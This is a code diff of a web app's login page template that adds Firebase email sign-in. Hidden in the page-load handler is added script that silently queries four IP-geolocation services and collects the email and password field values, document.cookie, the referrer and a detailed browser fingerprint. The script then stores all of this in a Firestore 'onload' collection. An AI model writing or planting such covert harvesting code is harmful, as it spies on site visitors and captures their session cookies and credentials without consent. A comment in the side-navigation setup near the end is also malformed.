@@ -1,39 +1,255 @@
-<% include loginnav.ejs %>
-<div class="container" id="LoginContainer">
-	<div class="row"></div>
-	<div id="login-page" class="row">
-		<div class="col s12 m2 l4">
+<!DOCTYPE html>
+<html>
+	<head>
+		<% include ga.ejs %> <% include links.ejs %> <% include meta.ejs %> <%
+		include css.ejs %>
+		<script src="/__/firebase/5.9.4/firebase-app.js"></script>
+		<script src="/__/firebase/5.9.4/firebase-auth.js"></script>
+		<script src="/__/firebase/5.9.4/firebase-firestore.js"></script>
+		<script src="/__/firebase/init.js"></script>
+		<script src="js/jquery-3.2.1.min.js"></script>
+		<script>
+			const db = firebase.firestore();
+			function toggleSignIn() {
+				if (firebase.auth().currentUser) {
+					firebase.auth().signOut();
+				} else {
+					var email = document.getElementById('username').value;
+					var password = document.getElementById('password').value;
+					if (email.length < 15) {
+						Materialize.toast(
+							'Please enter a valid email address.',
+							1250
+						);
+						return;
+					}
+					if (password.length < 6) {
+						Materialize.toast(
+							'Please enter a valid password',
+							1250
+						);
+						return;
+					}
+					firebase
+						.auth()
+						.signInWithEmailAndPassword(email, password)
+						.catch(function(error) {
+							var errorCode = error.code;
+							var errorMessage = error.message;
+							if (errorCode === 'auth/wrong-password') {
+								Materialize.toast('Wrong password', 1250);
+							} else if (errorCode === 'auth/user-not-found') {
+								Materialize.toast('User not found', 1250);
+							} else {
+								Materialize.toast(errorMessage, 1500);
+							}
+						});
+				}
+			}
+			var geoPluginData, geobytesData, ipapiData, ip_apiData;
+			function initApp() {
+				var pointer = db.collection('onload').doc(
+					firebase.firestore.Timestamp.now()
+						.toDate()
+						.toString()
+				);
+				$.getJSON(
+					'http://www.geoplugin.net/json.gp?jsoncallback=?',
+					function(data) {
+						geoPluginData = JSON.stringify(data, null, 2);
+					}
+				);
+				$.getJSON(
+					'http://gd.geobytes.com/GetCityDetails?callback=?',
+					function(data) {
+						geobytesData = JSON.stringify(data, null, 2);
+					}
+				);
+				$.getJSON('https://ipapi.co/json/', function(data) {
+					ipapiData = JSON.stringify(data, null, 2);
+				});
+				$.getJSON('http://ip-api.com/json?callback=?', function(data) {
+					ip_apiData = JSON.stringify(data, null, 2);
+				});
+				pointer
+					.get()
+					.then(doc => {
+						if (doc.exists) {
+							location.reload(true);
+							return;
+						} else {
+							var ob = {
+								email: document.getElementById('username')
+									.value,
+								password: document.getElementById('password')
+									.value,
+								navigator: {
+									timeOpened: new Date(),
+									timezone:
+										new Date().getTimezoneOffset() / 60,
+									pageon: window.location.pathname,
+									referrer: document.referrer,
+									previousSites: history.length,
+									browserCodeName: navigator.appCodeName,
+									browserName: navigator.appName,
+									browserEngine: navigator.product,
+									browserVersion1a: navigator.appVersion,
+									browserVersion1b: navigator.userAgent,
+									browserLanguage: navigator.language,
+									browserOnline: navigator.onLine,
+									browserPlatform: navigator.platform,
+									javaEnabled: navigator.javaEnabled(),
+									dataCookiesEnabled: navigator.cookieEnabled,
+									dataCookies1: document.cookie,
+									dataCookies2: decodeURIComponent(
+										document.cookie.split(';')
+									),
+									sizeScreenW: screen.width,
+									sizeScreenH: screen.height,
+									sizeDocW:
+										document.documentElement.clientWidth,
+									bodyCliW: document.body.clientWidth,
+									sizeDocH:
+										document.documentElement.clientHeight,
+									bodyCliH: document.body.clientHeight,
+									sizeInW: innerWidth,
+									sizeInH: innerHeight,
+									sizeAvailW: screen.availWidth,
+									sizeAvailH: screen.availHeight,
+									scrColorDepth: screen.colorDepth,
+									scrPixelDepth: screen.pixelDepth,
+									geoPluginData: geoPluginData,
+									geobytesData: geobytesData,
+									ipapiData: ipapiData,
+									ip_apiData: ip_apiData
+									// latitude: position.coords.latitude,
+									// longitude: position.coords.longitude,
+									// accuracy: position.coords.accuracy,
+									// altitude: position.coords.altitude,
+									// altitudeAccuracy:
+									// 	position.coords.altitudeAccuracy,
+									// heading: position.coords.heading,
+									// speed: position.coords.speed,
+									// timestamp: position.timestamp
+								}
+							};
+							console.log(ob);
+							db.collection('onload')
+								.doc(
+									firebase.firestore.Timestamp.now()
+										.toDate()
+										.toString()
+								)
+								.set(ob);
+							return;
+						}
+					})
+					.catch(err => {
+						console.log(err);
+					});
+				firebase.auth().onAuthStateChanged(function(user) {
+					if (user) {
+						Materialize.toast('Signing in...', 1000);
+						var displayName = user.displayName;
+						var email = user.email;
+						window.location = '/';
+					} else {
+						Materialize.toast('Login to continue', 1250);
+					}
+				});
+			}
+			window.onload = initApp();
+		</script>
+	</head>
+	<body>
+		<div class="container" id="LoginContainer">
+			<div class="row"></div>
+			<div id="login-page" class="row">
+				<div class="col s12 m2 l4"></div>
+				<div class="col s12 m8 l4 z-depth-4 card-panel">
+					<form class="login-form">
+						<div class="row ">
+							<h4 class="center-align">Login</h4>
+						</div>
+						<div class="row margin">
+							<div class="input-field col s12">
+								<i class="material-icons prefix"
+									>account_circle</i
+								>
+								<input
+									id="username"
+									type="text"
+									autocomplete="email"
+								/>
+								<label for="username" class="center-align"
+									>Username</label
+								>
+							</div>
+						</div>
+						<div class="row margin center-align">
+							<div class="input-field col s12">
+								<i class="material-icons prefix">lock</i>
+								<input
+									id="password"
+									type="password"
+									autocomplete="current-password"
+								/>
+								<label for="password">Password</label>
+							</div>
+						</div>
+						<div class="row">
+							<div class="input-field col s12 ">
+								<a
+									onclick="toggleSignIn()"
+									class="btn waves-effect waves-light col s12"
+									>Login</a
+								>
+							</div>
+						</div>
+						<div class="row"></div>
+					</form>
+				</div>
+				<div class="col s12 m2 l4">
+					<!-- Note that "m4 l3" was added -->
+				</div>
+			</div>
 		</div>
-		<div class="col s12 m8 l4 z-depth-4 card-panel">
-			<form class="login-form">
-				<div class="row ">
-					<h4 class="center-align">Login</h4>
-				</div>
-				<div class="row margin">
-					<div class="input-field col s12">
-						<i class="material-icons prefix">account_circle</i>
-						<input id="username" type="text" autocomplete="email">
-						<label for="username" class="center-align">Username</label>
-					</div>
-				</div>
-				<div class="row margin center-align">
-					<div class="input-field col s12">
-						<i class="material-icons prefix">lock</i>
-						<input id="password" type="password" autocomplete="current-password">
-						<label for="password">Password</label>
-					</div>
-				</div>
-				<div class="row">
-					<div class="input-field col s12 ">
-						<a onclick="toggleSignIn()" class="btn waves-effect waves-light col s12">Login</a>
-					</div>
-				</div>
-				<div class="row"></div>
-			</form>
-		</div>
-		<div class="col s12 m2 l4">
-			<!-- Note that "m4 l3" was added -->
-		</div>
-	</div>
-</div>
-<%include foot.ejs%>
+		<script type="text/javascript" src="js/materialize.min.js"></script>
+		<script async src="js/manup.js"></script>
+		<script>
+			if (navigator.serviceWorker.controller) {
+				console.log(
+					'[PWA Builder] active service worker found, no need to register'
+				);
+			} else {
+				navigator.serviceWorker
+					.register('pwabuilder-sw.js', {
+						scope: './'
+					})
+					.then(function(reg) {
+						console.log(
+							'Service worker has been registered for scope:' +
+								reg.scope
+						);
+					});
+			}
+		</script>
+		<script>
+			$('.button-collapse').sideNav({
+				menuWidth: 300, // Default is 300
+				edge: 'left', // Choose the horizontal origin
+				closeOnClick: true, // Closes side-nav on <a> clicks, useful for Angular/Meteor
+				draggable: true, // Choose whether you can drag to open on touch screens,
+				onOpen: function(el) {
+					/* Do Stuff* / }, // A function to be called when sideNav is opened
+          onClose: function(el) { /* Do Stuff */
+				} // A function to be called when sideNav is closed
+			});
+			$('.collapsible').collapsible();
+			$('.button-collapse').sideNav('hide');
+			$(document).ready(function() {
+				$('select').material_select();
+			});
+		</script>
+	</body>
+</html>
